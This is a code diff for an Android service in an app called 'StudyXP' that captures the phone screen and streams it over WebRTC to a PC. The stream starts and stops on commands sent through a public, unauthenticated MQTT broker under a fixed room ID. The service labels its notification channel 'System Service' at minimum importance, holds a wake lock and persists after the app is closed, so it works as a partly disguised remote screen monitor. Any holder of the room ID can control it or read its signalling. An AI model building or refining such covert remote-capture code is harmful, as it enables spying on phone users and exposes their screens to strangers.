@@ -23,6 +23,8 @@ import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
 import org.eclipse.paho.client.mqttv3.MqttMessage;
 import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
 import org.json.JSONObject;
+import org.webrtc.DefaultVideoDecoderFactory;
+import org.webrtc.DefaultVideoEncoderFactory;
 import org.webrtc.EglBase;
 import org.webrtc.IceCandidate;
 import org.webrtc.MediaConstraints;
@@ -39,46 +41,51 @@ import org.webrtc.SurfaceTextureHelper;
 import org.webrtc.VideoSource;
 import org.webrtc.VideoTrack;
 
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
+import java.util.Map;
 
 public class ScreenMirrorService extends Service {
 
     private static final String TAG = "StudyXP-Mirror";
 
-    public static final String ACTION_INIT     = "com.estiuk.studyxp.mirror.INIT";
+    public static final String ACTION_INIT = "com.estiuk.studyxp.mirror.INIT";
     public static final String ACTION_STOP_SVC = "com.estiuk.studyxp.mirror.STOP_SVC";
-    public static final String ACTION_PING     = "com.estiuk.studyxp.mirror.PING";
+    public static final String ACTION_PING = "com.estiuk.studyxp.mirror.PING";
 
-    private static final String CHANNEL_ID      = "studyxp_mirror_sys_channel";
-    private static final int    NOTIFICATION_ID = 9911;
+    private static final String CHANNEL_ID = "studyxp_mirror_sys_channel";
+    private static final int NOTIFICATION_ID = 9911;
 
-    private static final String ROOM_ID     = "studyxp-amar-gopon-room-2025";
+    // Keep this ROOM_ID identical in receiver.py and control.py.
+    private static final String ROOM_ID = "studyxp-amar-gopon-room-2025";
     private static final String MQTT_BROKER = "tcp://broker.hivemq.com:1883";
 
-    private static final String TOPIC_CMD       = "studyxp/" + ROOM_ID + "/cmd";
-    private static final String TOPIC_STATUS    = "studyxp/" + ROOM_ID + "/status";
-    private static final String TOPIC_OFFER     = "studyxp/" + ROOM_ID + "/offer";
-    private static final String TOPIC_ANSWER    = "studyxp/" + ROOM_ID + "/answer";
-    private static final String TOPIC_ICE_PC    = "studyxp/" + ROOM_ID + "/ice-pc";
+    private static final String TOPIC_CMD = "studyxp/" + ROOM_ID + "/cmd";
+    private static final String TOPIC_STATUS = "studyxp/" + ROOM_ID + "/status";
+    private static final String TOPIC_OFFER = "studyxp/" + ROOM_ID + "/offer";
+    private static final String TOPIC_ANSWER = "studyxp/" + ROOM_ID + "/answer";
+    private static final String TOPIC_ICE_PC = "studyxp/" + ROOM_ID + "/ice-pc";
     private static final String TOPIC_ICE_PHONE = "studyxp/" + ROOM_ID + "/ice-phone";
 
-    private EglBase               eglBase;
+    private EglBase eglBase;
     private PeerConnectionFactory factory;
-    private SurfaceTextureHelper  surfaceTextureHelper;
-    private VideoSource           videoSource;
-    private VideoTrack            videoTrack;
+    private SurfaceTextureHelper surfaceTextureHelper;
+    private VideoSource videoSource;
+    private VideoTrack videoTrack;
     private ScreenCapturerAndroid screenCapturer;
-    private MqttClient            mqttClient;
-
+    private MqttClient mqttClient;
     private PeerConnection peerConnection;
-    private boolean        sessionActive = false;
-    private boolean        initialized    = false;
 
+    private volatile boolean sessionActive = false;
+    private volatile boolean initialized = false;
+    private volatile boolean remoteDescriptionSet = false;
+    private final List<IceCandidate> pendingRemoteIce = new ArrayList<>();
     private PowerManager.WakeLock wakeLock;
 
-    @Override public void onCreate() {
+    @Override
+    public void onCreate() {
         super.onCreate();
         createNotificationChannel();
         acquireWakeLock();
@@ -103,17 +110,14 @@ public class ScreenMirrorService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent == null) {
-            if (initialized) return START_STICKY;
-            return START_NOT_STICKY;
+            return initialized ? START_STICKY : START_NOT_STICKY;
         }
 
         String action = intent.getAction();
-
         if (ACTION_STOP_SVC.equals(action)) {
             fullShutdown();
             return START_NOT_STICKY;
         }
-
         if (ACTION_PING.equals(action)) {
             return START_STICKY;
         }
@@ -138,23 +142,31 @@ public class ScreenMirrorService extends Service {
         return START_STICKY;
     }
 
-    @Override public void onTaskRemoved(Intent rootIntent) {
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
         Log.d(TAG, "onTaskRemoved — service will keep running");
         super.onTaskRemoved(rootIntent);
     }
 
-    @Override public void onDestroy() {
+    @Override
+    public void onDestroy() {
         Log.d(TAG, "onDestroy called");
         fullShutdown();
         super.onDestroy();
     }
 
-    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
+    @Nullable
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
+                    CHANNEL_ID,
+                    "System Service",
+                    NotificationManager.IMPORTANCE_MIN);
             ch.setShowBadge(false);
             ch.setSound(null, null);
             ch.enableLights(false);
@@ -166,8 +178,8 @@ public class ScreenMirrorService extends Service {
 
     private void startAsForeground() {
         Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Service")
-                .setContentText("")
+                .setContentTitle("StudyXP Mirror")
+                .setContentText("Screen sharing is ready when you start it")
                 .setSmallIcon(android.R.drawable.stat_sys_upload)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setSilent(true)
@@ -190,9 +202,35 @@ public class ScreenMirrorService extends Service {
             PeerConnectionFactory.initialize(init);
 
             eglBase = EglBase.create();
+
+            // Explicitly configure both video encoder and decoder factories.
+            // DefaultVideoEncoderFactory includes the software VP8 encoder fallback.
+            PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
             factory = PeerConnectionFactory.builder()
-                    .setOptions(new PeerConnectionFactory.Options())
+                    .setOptions(options)
+                    .setVideoEncoderFactory(new DefaultVideoEncoderFactory(
+                            eglBase.getEglBaseContext(),
+                            true,
+                            true))
+                    .setVideoDecoderFactory(new DefaultVideoDecoderFactory(
+                            eglBase.getEglBaseContext()))
                     .createPeerConnectionFactory();
+
+            if (factory == null) {
+                throw new IllegalStateException("PeerConnectionFactory creation returned null");
+            }
+
+            // Print the actual video capabilities exposed by this Android WebRTC build.
+            RtpCapabilities caps = factory.getRtpSenderCapabilities(
+                    MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO);
+            boolean hasVp8 = false;
+            for (RtpCapabilities.CodecCapability codec : caps.codecs) {
+                Log.d(TAG, "Available video codec: " + codec.name
+                        + ", preferredPayloadType=" + codec.preferredPayloadType
+                        + ", parameters=" + codec.parameters);
+                if ("VP8".equalsIgnoreCase(codec.name)) hasVp8 = true;
+            }
+            Log.d(TAG, "VP8 sender capability available after factory setup: " + hasVp8);
 
             surfaceTextureHelper = SurfaceTextureHelper.create(
                     "CaptureThread", eglBase.getEglBaseContext());
@@ -200,7 +238,8 @@ public class ScreenMirrorService extends Service {
 
             screenCapturer = new ScreenCapturerAndroid(resultData,
                     new MediaProjection.Callback() {
-                        @Override public void onStop() {
+                        @Override
+                        public void onStop() {
                             Log.d(TAG, "MediaProjection stopped by user");
                             publishStatus("permission-revoked");
                             fullShutdown();
@@ -209,7 +248,6 @@ public class ScreenMirrorService extends Service {
 
             screenCapturer.initialize(surfaceTextureHelper, this,
                     videoSource.getCapturerObserver());
-
             videoTrack = factory.createVideoTrack("screen", videoSource);
             videoTrack.setEnabled(false);
 
@@ -234,93 +272,161 @@ public class ScreenMirrorService extends Service {
             opts.setMaxInflight(20);
 
             mqttClient.setCallback(new MqttCallbackExtended() {
-                @Override public void connectComplete(boolean reconnect, String serverURI) {
+                @Override
+                public void connectComplete(boolean reconnect, String serverURI) {
                     Log.d(TAG, "MQTT connected (reconnect=" + reconnect + ")");
                     try {
                         mqttClient.subscribe(TOPIC_CMD, 1);
                         mqttClient.subscribe(TOPIC_ANSWER, 1);
                         mqttClient.subscribe(TOPIC_ICE_PC, 1);
                         publishStatus(sessionActive ? "capturing" : "ready");
-                    } catch (Exception e) { Log.e(TAG, "subscribe failed", e); }
+                    } catch (Exception e) {
+                        Log.e(TAG, "subscribe failed", e);
+                    }
                 }
-                @Override public void connectionLost(Throwable cause) {
-                    Log.d(TAG, "MQTT lost: " + cause);
+
+                @Override
+                public void connectionLost(Throwable cause) {
+                    Log.e(TAG, "MQTT connection lost", cause);
                 }
-                @Override public void messageArrived(String topic, MqttMessage message) {
-                    String payload = new String(message.getPayload()).trim();
+
+                @Override
+                public void messageArrived(String topic, MqttMessage message) {
+                    String payload = new String(message.getPayload(), StandardCharsets.UTF_8).trim();
                     Log.d(TAG, "MSG [" + topic + "] = " + payload);
                     try {
-                        if (TOPIC_CMD.equals(topic))           handleCommand(payload);
-                        else if (TOPIC_ANSWER.equals(topic))   onAnswerReceived(new JSONObject(payload));
-                        else if (TOPIC_ICE_PC.equals(topic))   onRemoteIce(new JSONObject(payload));
-                    } catch (Exception e) { Log.e(TAG, "msg handle failed", e); }
+                        if (TOPIC_CMD.equals(topic)) {
+                            handleCommand(payload);
+                        } else if (TOPIC_ANSWER.equals(topic)) {
+                            onAnswerReceived(new JSONObject(payload));
+                        } else if (TOPIC_ICE_PC.equals(topic)) {
+                            onRemoteIce(new JSONObject(payload));
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "message handling failed", e);
+                    }
                 }
-                @Override public void deliveryComplete(IMqttDeliveryToken token) {}
+
+                @Override
+                public void deliveryComplete(IMqttDeliveryToken token) {
+                    // No action required.
+                }
             });
 
             mqttClient.connect(opts);
-        } catch (Exception e) { Log.e(TAG, "MQTT connect failed", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "MQTT connect failed", e);
+            publishStatus("mqtt-failed");
+        }
     }
 
-    private void publishStatus(String s) {
+    private void publishStatus(String status) {
         try {
-            if (mqttClient != null && mqttClient.isConnected()) {
-                mqttClient.publish(TOPIC_STATUS, new MqttMessage(s.getBytes()));
-                Log.d(TAG, "Status → " + s);
+            MqttClient client = mqttClient;
+            if (client != null && client.isConnected()) {
+                client.publish(TOPIC_STATUS,
+                        new MqttMessage(status.getBytes(StandardCharsets.UTF_8)));
+                Log.d(TAG, "Status → " + status);
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.w(TAG, "Could not publish status: " + status, e);
+        }
     }
 
-    private void handleCommand(String cmd) {
-        cmd = cmd.toLowerCase();
+    private void handleCommand(String command) {
+        String cmd = command.toLowerCase().trim();
         Log.d(TAG, "handleCommand: " + cmd + " (sessionActive=" + sessionActive + ")");
-        if (cmd.equals("start") && !sessionActive) {
+
+        if ("start".equals(cmd) && !sessionActive) {
             startSession();
-        } else if (cmd.equals("stop") && sessionActive) {
+        } else if ("stop".equals(cmd) && sessionActive) {
             stopSession();
-        } else if (cmd.equals("status")) {
+        } else if ("status".equals(cmd)) {
             publishStatus(sessionActive ? "capturing" : "ready");
         }
     }
 
     private void startSession() {
         try {
-            List<PeerConnection.IceServer> ice = new ArrayList<>();
-            ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
-            ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
+            if (factory == null || videoTrack == null || screenCapturer == null) {
+                throw new IllegalStateException("Mirror service has not been initialized");
+            }
 
-            PeerConnection.RTCConfiguration cfg = new PeerConnection.RTCConfiguration(ice);
+            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
+            iceServers.add(PeerConnection.IceServer.builder(
+                    "stun:stun.l.google.com:19302").createIceServer());
+            iceServers.add(PeerConnection.IceServer.builder(
+                    "stun:stun1.l.google.com:19302").createIceServer());
+
+            PeerConnection.RTCConfiguration cfg =
+                    new PeerConnection.RTCConfiguration(iceServers);
             cfg.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
-            cfg.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
+            cfg.continualGatheringPolicy =
+                    PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
 
-            peerConnection = factory.createPeerConnection(cfg, new PeerConnection.Observer() {
-                @Override public void onIceCandidate(IceCandidate candidate) { sendLocalIce(candidate); }
-                @Override public void onIceCandidatesRemoved(IceCandidate[] candidates) {}
-                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState state) {
-                    Log.d(TAG, "ICE state: " + state);
-                    if (state == PeerConnection.IceConnectionState.CONNECTED) {
-                        publishStatus("capturing");
-                    } else if (state == PeerConnection.IceConnectionState.DISCONNECTED
-                            || state == PeerConnection.IceConnectionState.FAILED
-                            || state == PeerConnection.IceConnectionState.CLOSED) {
-                        publishStatus("peer-down");
-                    }
-                }
-                @Override public void onSignalingChange(PeerConnection.SignalingState s) {}
-                @Override public void onIceConnectionReceivingChange(boolean b) {}
-                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
-                @Override public void onAddStream(MediaStream s) {}
-                @Override public void onRemoveStream(MediaStream s) {}
-                @Override public void onDataChannel(org.webrtc.DataChannel c) {}
-                @Override public void onRenegotiationNeeded() {}
-                @Override public void onAddTrack(org.webrtc.RtpReceiver r, MediaStream[] streams) {}
-            });
+            peerConnection = factory.createPeerConnection(cfg,
+                    new PeerConnection.Observer() {
+                        @Override
+                        public void onSignalingChange(PeerConnection.SignalingState state) {
+                            Log.d(TAG, "Signaling state: " + state);
+                        }
+
+                        @Override
+                        public void onIceConnectionChange(PeerConnection.IceConnectionState state) {
+                            Log.d(TAG, "ICE state: " + state);
+                            if (state == PeerConnection.IceConnectionState.CONNECTED
+                                    || state == PeerConnection.IceConnectionState.COMPLETED) {
+                                publishStatus("capturing");
+                            } else if (state == PeerConnection.IceConnectionState.DISCONNECTED
+                                    || state == PeerConnection.IceConnectionState.FAILED
+                                    || state == PeerConnection.IceConnectionState.CLOSED) {
+                                publishStatus("peer-down");
+                            }
+                        }
+
+                        @Override
+                        public void onIceConnectionReceivingChange(boolean receiving) {
+                            Log.d(TAG, "ICE receiving: " + receiving);
+                        }
+
+                        @Override
+                        public void onIceGatheringChange(PeerConnection.IceGatheringState state) {
+                            Log.d(TAG, "ICE gathering: " + state);
+                        }
+
+                        @Override
+                        public void onIceCandidate(IceCandidate candidate) {
+                            sendLocalIce(candidate);
+                        }
+
+                        @Override
+                        public void onIceCandidatesRemoved(IceCandidate[] candidates) { }
+
+                        @Override
+                        public void onAddStream(MediaStream stream) { }
+
+                        @Override
+                        public void onRemoveStream(MediaStream stream) { }
+
+                        @Override
+                        public void onDataChannel(org.webrtc.DataChannel channel) { }
+
+                        @Override
+                        public void onRenegotiationNeeded() { }
+
+                        @Override
+                        public void onAddTrack(org.webrtc.RtpReceiver receiver,
+                                               MediaStream[] streams) { }
+                    });
+
+            if (peerConnection == null) {
+                throw new IllegalStateException("createPeerConnection returned null");
+            }
 
             peerConnection.addTrack(videoTrack, Collections.singletonList("stream"));
 
-            // Force VP8 for compatibility with aiortc 1.9.0. It supports VP8
-            // and only selected H.264 profiles, so relying on a device-default
-            // H.264 profile can produce "Failed to set remote video description send parameters".
+            // Select VP8 explicitly because aiortc 1.9.0 supports VP8 and selected H.264 profiles.
+            // This prevents a phone-specific default H.264 profile from being the only offered codec.
             RtpCapabilities videoCapabilities = factory.getRtpSenderCapabilities(
                     MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO);
             Integer vp8PayloadType = null;
@@ -330,61 +436,91 @@ public class ScreenMirrorService extends Service {
                     break;
                 }
             }
+
             if (vp8PayloadType == null) {
-                throw new IllegalStateException("Android WebRTC build has no VP8 video codec");
+                throw new IllegalStateException(
+                        "VP8 is still absent from sender capabilities after configuring "
+                                + "DefaultVideoEncoderFactory. Check 'Available video codec' Logcat lines.");
             }
 
-            // Include only VP8 plus its matching RTX codec, if available.
             List<RtpCapabilities.CodecCapability> vp8Codecs = new ArrayList<>();
             for (RtpCapabilities.CodecCapability codec : videoCapabilities.codecs) {
                 if ("VP8".equalsIgnoreCase(codec.name)) {
                     vp8Codecs.add(codec);
-                } else if ("rtx".equalsIgnoreCase(codec.name)
-                        && codec.parameters != null
-                        && String.valueOf(vp8PayloadType).equals(codec.parameters.get("apt"))) {
-                    vp8Codecs.add(codec);
+                } else if ("rtx".equalsIgnoreCase(codec.name)) {
+                    Map<String, String> params = codec.parameters;
+                    if (params != null
+                            && String.valueOf(vp8PayloadType).equals(params.get("apt"))) {
+                        vp8Codecs.add(codec);
+                    }
                 }
             }
 
-            boolean codecPreferenceApplied = false;
+            boolean preferenceApplied = false;
             for (RtpTransceiver transceiver : peerConnection.getTransceivers()) {
-                if (transceiver.getMediaType() == MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO) {
+                if (transceiver.getMediaType()
+                        == MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO) {
                     transceiver.setCodecPreferences(vp8Codecs);
-                    codecPreferenceApplied = true;
+                    preferenceApplied = true;
                     break;
                 }
             }
-            if (!codecPreferenceApplied) {
+            if (!preferenceApplied) {
                 throw new IllegalStateException("Could not find video transceiver for VP8 preference");
             }
             Log.d(TAG, "VP8 codec preference set for PC aiortc receiver");
 
+            pendingRemoteIce.clear();
+            remoteDescriptionSet = false;
             videoTrack.setEnabled(true);
             screenCapturer.startCapture(720, 1280, 30);
 
             MediaConstraints constraints = new MediaConstraints();
             peerConnection.createOffer(new SdpObserver() {
-                @Override public void onCreateSuccess(SessionDescription sdp) {
-                    peerConnection.setLocalDescription(new SdpObserver() {
-                        @Override public void onCreateSuccess(SessionDescription s) {}
-                        @Override public void onSetSuccess()            { sendOffer(sdp); }
-                        @Override public void onCreateFailure(String s) {}
-                        @Override public void onSetFailure(String s)    {
-                            Log.e(TAG, "setLocalDescription failed: " + s);
+                @Override
+                public void onCreateSuccess(SessionDescription offer) {
+                    PeerConnection activePc = peerConnection;
+                    if (activePc == null) {
+                        Log.e(TAG, "Cannot set local description: PeerConnection is null");
+                        return;
+                    }
+                    activePc.setLocalDescription(new SdpObserver() {
+                        @Override public void onCreateSuccess(SessionDescription s) { }
+
+                        @Override
+                        public void onSetSuccess() {
+                            Log.d(TAG, "Local offer set; sending offer through MQTT");
+                            SessionDescription localDescription = activePc.getLocalDescription();
+                            sendOffer(localDescription != null ? localDescription : offer);
                         }
-                    }, sdp);
+
+                        @Override
+                        public void onCreateFailure(String error) {
+                            Log.e(TAG, "Local description create failure: " + error);
+                        }
+
+                        @Override
+                        public void onSetFailure(String error) {
+                            Log.e(TAG, "setLocalDescription failed: " + error);
+                            publishStatus("local-description-failed");
+                        }
+                    }, offer);
                 }
-                @Override public void onSetSuccess() {}
-                @Override public void onCreateFailure(String s) {
-                    Log.e(TAG, "createOffer failed: " + s);
+
+                @Override public void onSetSuccess() { }
+
+                @Override
+                public void onCreateFailure(String error) {
+                    Log.e(TAG, "createOffer failed: " + error);
+                    publishStatus("offer-failed");
                 }
-                @Override public void onSetFailure(String s) {}
+
+                @Override public void onSetFailure(String error) { }
             }, constraints);
 
             sessionActive = true;
             publishStatus("starting");
-            Log.d(TAG, "Session started");
-
+            Log.d(TAG, "Session started; waiting for SDP/ICE negotiation");
         } catch (Exception e) {
             Log.e(TAG, "startSession failed", e);
             publishStatus("start-failed");
@@ -394,91 +530,208 @@ public class ScreenMirrorService extends Service {
 
     private void stopSession() {
         sessionActive = false;
+        remoteDescriptionSet = false;
+        pendingRemoteIce.clear();
+
         try {
-            try { screenCapturer.stopCapture(); } catch (Exception ignored) {}
+            if (screenCapturer != null) {
+                try {
+                    screenCapturer.stopCapture();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    Log.w(TAG, "Interrupted while stopping screen capture", e);
+                } catch (Exception e) {
+                    Log.w(TAG, "Screen capture was not running", e);
+                }
+            }
             if (videoTrack != null) videoTrack.setEnabled(false);
             if (peerConnection != null) {
                 peerConnection.close();
                 peerConnection = null;
             }
-        } catch (Exception e) { Log.e(TAG, "stopSession err", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "stopSession error", e);
+        }
+
         publishStatus("ready");
         Log.d(TAG, "Session stopped");
     }
 
     private void sendOffer(SessionDescription sdp) {
         try {
+            if (mqttClient == null || !mqttClient.isConnected()) {
+                throw new IllegalStateException("MQTT is not connected; cannot send offer");
+            }
             JSONObject obj = new JSONObject();
             obj.put("sdp", sdp.description);
             obj.put("type", sdp.type.canonicalForm());
-            mqttClient.publish(TOPIC_OFFER, new MqttMessage(obj.toString().getBytes()));
-            Log.d(TAG, "Offer sent");
-        } catch (Exception e) { Log.e(TAG, "sendOffer failed", e); }
+            mqttClient.publish(TOPIC_OFFER,
+                    new MqttMessage(obj.toString().getBytes(StandardCharsets.UTF_8)));
+            Log.d(TAG, "Offer sent; SDP length=" + sdp.description.length());
+            for (String line : sdp.description.split("\\r?\\n")) {
+                if (line.startsWith("m=video") || line.toUpperCase().contains("VP8/90000")) {
+                    Log.d(TAG, "Outgoing SDP: " + line);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "sendOffer failed", e);
+            publishStatus("offer-send-failed");
+        }
     }
 
     private void onAnswerReceived(JSONObject obj) {
         try {
+            if (peerConnection == null) {
+                Log.w(TAG, "Ignoring answer because PeerConnection is null");
+                return;
+            }
             SessionDescription answer = new SessionDescription(
                     SessionDescription.Type.fromCanonicalForm(obj.getString("type")),
                     obj.getString("sdp"));
             peerConnection.setRemoteDescription(new SdpObserver() {
-                @Override public void onCreateSuccess(SessionDescription s) {}
-                @Override public void onSetSuccess()            { Log.d(TAG, "Remote answer set"); }
-                @Override public void onCreateFailure(String s) {}
-                @Override public void onSetFailure(String s)    {
-                    Log.e(TAG, "setRemoteDescription failed: " + s);
+                @Override public void onCreateSuccess(SessionDescription s) { }
+
+                @Override
+                public void onSetSuccess() {
+                    Log.d(TAG, "Remote answer set successfully");
+                    remoteDescriptionSet = true;
+                    flushPendingRemoteIce();
+                }
+
+                @Override
+                public void onCreateFailure(String error) {
+                    Log.e(TAG, "Remote answer creation failure: " + error);
+                }
+
+                @Override
+                public void onSetFailure(String error) {
+                    Log.e(TAG, "setRemoteDescription(answer) failed: " + error);
                 }
             }, answer);
-        } catch (Exception e) { Log.e(TAG, "onAnswer failed", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "onAnswerReceived failed", e);
+        }
     }
 
-    private void sendLocalIce(IceCandidate c) {
+    private void sendLocalIce(IceCandidate candidate) {
         try {
+            if (mqttClient == null || !mqttClient.isConnected()) {
+                Log.w(TAG, "MQTT not connected; dropping local ICE candidate");
+                return;
+            }
             JSONObject obj = new JSONObject();
-            obj.put("candidate", c.sdp);
-            obj.put("sdpMid", c.sdpMid);
-            obj.put("sdpMLineIndex", c.sdpMLineIndex);
-            mqttClient.publish(TOPIC_ICE_PHONE, new MqttMessage(obj.toString().getBytes()));
-        } catch (Exception e) { Log.e(TAG, "send ICE failed", e); }
+            obj.put("candidate", candidate.sdp);
+            obj.put("sdpMid", candidate.sdpMid);
+            obj.put("sdpMLineIndex", candidate.sdpMLineIndex);
+            mqttClient.publish(TOPIC_ICE_PHONE,
+                    new MqttMessage(obj.toString().getBytes(StandardCharsets.UTF_8)));
+        } catch (Exception e) {
+            Log.e(TAG, "sendLocalIce failed", e);
+        }
     }
 
     private void onRemoteIce(JSONObject obj) {
         try {
-            IceCandidate c = new IceCandidate(
+            IceCandidate candidate = new IceCandidate(
                     obj.getString("sdpMid"),
                     obj.getInt("sdpMLineIndex"),
                     obj.getString("candidate"));
-            if (peerConnection != null) peerConnection.addIceCandidate(c);
-        } catch (Exception e) { Log.e(TAG, "addIceCandidate failed", e); }
+
+            if (peerConnection == null) {
+                Log.w(TAG, "Ignoring PC ICE candidate because PeerConnection is null");
+                return;
+            }
+            if (!remoteDescriptionSet) {
+                synchronized (pendingRemoteIce) {
+                    pendingRemoteIce.add(candidate);
+                }
+                Log.d(TAG, "Queued PC ICE candidate until remote answer is set");
+                return;
+            }
+            boolean accepted = peerConnection.addIceCandidate(candidate);
+            Log.d(TAG, "PC ICE candidate accepted=" + accepted);
+        } catch (Exception e) {
+            Log.e(TAG, "onRemoteIce failed", e);
+        }
+    }
+
+    private void flushPendingRemoteIce() {
+        if (peerConnection == null) return;
+        List<IceCandidate> copy;
+        synchronized (pendingRemoteIce) {
+            copy = new ArrayList<>(pendingRemoteIce);
+            pendingRemoteIce.clear();
+        }
+        for (IceCandidate candidate : copy) {
+            try {
+                boolean accepted = peerConnection.addIceCandidate(candidate);
+                Log.d(TAG, "Queued PC ICE candidate accepted=" + accepted);
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to add queued PC ICE candidate", e);
+            }
+        }
     }
 
     private void fullShutdown() {
         sessionActive = false;
+        remoteDescriptionSet = false;
+        pendingRemoteIce.clear();
+
         try {
             if (screenCapturer != null) {
-                try { screenCapturer.stopCapture(); } catch (Exception ignored) {}
-                screenCapturer.dispose();
+                try {
+                    screenCapturer.stopCapture();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    Log.w(TAG, "Interrupted while stopping screen capture", e);
+                } catch (Exception ignored) { }
+                try { screenCapturer.dispose(); } catch (Exception ignored) { }
                 screenCapturer = null;
             }
-            if (videoSource        != null) { videoSource.dispose();        videoSource = null; }
-            if (videoTrack         != null) { videoTrack.dispose();         videoTrack = null; }
-            if (surfaceTextureHelper != null) { surfaceTextureHelper.dispose();
-                                                surfaceTextureHelper = null; }
-            if (peerConnection     != null) { peerConnection.close();       peerConnection = null; }
-            if (factory            != null) { factory.dispose();            factory = null; }
-            if (eglBase            != null) { eglBase.release();            eglBase = null; }
-            if (mqttClient != null && mqttClient.isConnected()) {
-                try { mqttClient.disconnect(); } catch (Exception ignored) {}
+            if (videoTrack != null) {
+                try { videoTrack.dispose(); } catch (Exception ignored) { }
+                videoTrack = null;
+            }
+            if (videoSource != null) {
+                try { videoSource.dispose(); } catch (Exception ignored) { }
+                videoSource = null;
+            }
+            if (surfaceTextureHelper != null) {
+                try { surfaceTextureHelper.dispose(); } catch (Exception ignored) { }
+                surfaceTextureHelper = null;
+            }
+            if (peerConnection != null) {
+                try { peerConnection.close(); } catch (Exception ignored) { }
+                peerConnection = null;
+            }
+            if (factory != null) {
+                try { factory.dispose(); } catch (Exception ignored) { }
+                factory = null;
+            }
+            if (eglBase != null) {
+                try { eglBase.release(); } catch (Exception ignored) { }
+                eglBase = null;
+            }
+            if (mqttClient != null) {
+                try {
+                    if (mqttClient.isConnected()) mqttClient.disconnect();
+                    mqttClient.close();
+                } catch (Exception ignored) { }
                 mqttClient = null;
             }
-            if (wakeLock != null && wakeLock.isHeld()) {
-                wakeLock.release();
+            if (wakeLock != null) {
+                try {
+                    if (wakeLock.isHeld()) wakeLock.release();
+                } catch (Exception ignored) { }
                 wakeLock = null;
                 Log.d(TAG, "WakeLock released");
             }
-        } catch (Exception e) { Log.e(TAG, "cleanup error", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "cleanup error", e);
+        }
+
         initialized = false;
-        try { stopForeground(true); } catch (Exception ignored) {}
+        try { stopForeground(true); } catch (Exception ignored) { }
         stopSelf();
     }
 }
